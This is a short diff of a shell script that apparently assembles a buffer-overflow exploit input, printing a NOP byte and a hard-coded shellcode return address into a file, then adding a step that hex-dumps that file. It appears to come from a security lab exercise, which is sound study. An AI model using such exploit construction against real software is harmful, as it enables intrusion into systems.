@@ -18,3 +18,6 @@ perl -e 'print "\x90"' | ndisasm -b 32 -
     perl -e 'print "\xca\xf8\xff\xbf"'  # Shellcode address (4 byte)
 } > 03_iv
 
+# Create a hex dump and the exploitation file
+hd ./03_iv &> 04_iv_hexdump.txt
+
